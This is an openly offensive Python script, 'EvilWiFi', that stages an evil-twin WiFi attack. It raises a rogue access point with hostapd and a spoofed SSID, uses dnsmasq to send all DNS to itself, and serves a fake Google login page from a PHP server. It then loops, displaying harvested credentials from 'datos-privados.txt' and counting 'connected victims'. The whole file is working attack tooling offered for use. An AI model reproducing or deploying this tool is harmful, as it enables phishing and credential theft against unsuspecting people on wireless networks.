#!/bin/usr/python3

# Author: Slax38

import os, time, requests, sys
import re, subprocess
import random
import getopt
import signal

plantillas = ["google-login"]

options = "h:i:e:c:"
DN = open(os.devnull, 'w')


print()
print("EvilWiFi v1.0.0 WiFi Evil-Twin Attack Tool, Slax38")
print()
print("Arguments:")
print("-h, --helpPanel")
print("-i, --interface=wlan0")
print("-e, --ssid")
print("-c, --ch")
print()
print("Example: evilwifi.py -i wlan0 -e Liveboox_A51 -c 6")


def sig_handler(sig, frame):
    print("[+] Extiting...")
    os.system("rm dnsmasq.conf configuracion2.conf 2> /dev/null")
    os.system("rm -r iface 2> /dev/null")
    os.system("find \-name datos-privados.txt | xargs rm 2>/dev/null")
    os.system("service network-manager restart > /devnull 2>&1")
    sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)



def getCredentials():
    activeHosts = 0
    while True:
        print(f"[+] Waiting for credentials...")
        print()
        for i in range(1, 61):
            print(f"-", end="")
        print()
        print(f"[+] Connected victims: {activeHosts}")
        os.system("find \-name datos-privados.txt | xargs cat 2>/dev/null")
        for i in range(1, 61):
            print(f"-", end="")
        print()
        activeHosts = len(subprocess.run(["bash", "utilities/hostsCheck.sh"], stdout=subprocess.PIPE).stdout.splitlines())
        time.sleep(3)
        os.system("clear")

def evilattack(interface, ssid, channel):
   print()
   print()
   print("EvilWiFi v1.0.0 WiFi Evil-Twin Attack Tool, Slax38")
   print()
   print("[i] if hostapd does not create the AP test by disconnecting the interface")
   time.sleep(1.5)
   print("[+] Killing process")
   with open("/dev/null", "w") as f:
     os.system("killall hostapd > /dev/null 2>&1")
     time.sleep(0.15)
     subprocess.run(["airmon-ng", "check", "kill"], stdout=f)
     time.sleep(0.15)
     print("[+] Configuring interface...")
     subprocess.run(["airmon-ng", "stop", interface], stdout=f)
     time.sleep(0.15)
     subprocess.run(["airmon-ng", "start", interface], stdout=f)
     time.sleep(0.15)
     subprocess.run(["airmon-ng", "stop", interface], stdout=f)
     time.sleep(0.15)
     subprocess.run(["airmon-ng", "start", interface], stdout=f)
     time.sleep(1)
     print("[+] Starting hostapd")

   with open("configuracion2.conf", "w") as file:
       file.write(f"interface={interface}\n")
       file.write(f"driver=nl80211\n")
       file.write(f"ssid={ssid}\n")
       file.write(f"hw_mode=g\n")
       file.write(f"channel={channel}\n")
       file.write(f"macaddr_acl=0\n")
       file.write(f"auth_algs=1\n")
       file.write(f"ignore_broadcast_ssid=0\n")
       file.write(f"logger_stdout=1\n")
   
   os.system("hostapd configuracion2.conf > /dev/null 2>&1 & sleep 7 ")
   print("[+] Configuring dnsmasq...")
   with open("dnsmasq.conf", "w") as file:
       file.write(f"interface={interface}\n")
       file.write(f"dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n")
       file.write(f"dhcp-option=3,192.168.1.1\n")
       file.write(f"dhcp-option=6,192.168.1.1\n")
       file.write(f"server=8.8.8.8\n")
       file.write(f"log-queries\n")
       file.write(f"log-dhcp\n")
       file.write(f"listen-address=127.0.0.1\n")
       file.write(f"address=/#/192.168.1.1\n")
       
   subprocess.run(["ifconfig",interface, "up", "192.168.1.1", "netmask", "255.255.255.0"])
   time.sleep(1.5)
   os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
   time.sleep(1.5)
   os.system("dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 & sleep 6")
   time.sleep(3)
   plantilla()

def plantilla():
    plantillas = ["google-login"]

    print("[i] Choose template: google-login")
    template = input("> ")

    check_plantillas = 0
    for plantilla in plantillas:
        if plantilla == template:
            check_plantillas = 1

    if check_plantillas == 1:
        os.chdir(template)
        print("[+] Mounting PHP server...")
        subprocess.Popen(["php", "-S", "192.168.1.1:80"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        os.chdir("..")
        getCredentials()
       

def helpPanel():
   print()
   print("EvilWiFi v1.0.0 WiFi Evil-Twin Attack Tool, Slax38")
   print()
   print("Arguments:")
   print("-h, --helpPanel")
   print("-i, --interface=wlan0")
   print("-e, --ssid")
   print("-c, --ch")
   print()
   print("Example: evilwifi.py -i wlan0 -e Liveboox_A51 -c 6")

try:
  opts, args = getopt.getopt(sys.argv[1:], options)
except getopt.GetoptError:
  sys.exit(2)

interface = None
ssid = None
channel = None

for opt, arg in opts:
  if opt == "-h":
    helpPanel()
  elif opt == "-i":
    interface = arg
  elif opt == "-e":
    ssid = arg
  elif opt == "-c":
    channel = arg
if interface and ssid and channel is not None:
  evilattack(interface, ssid, channel)
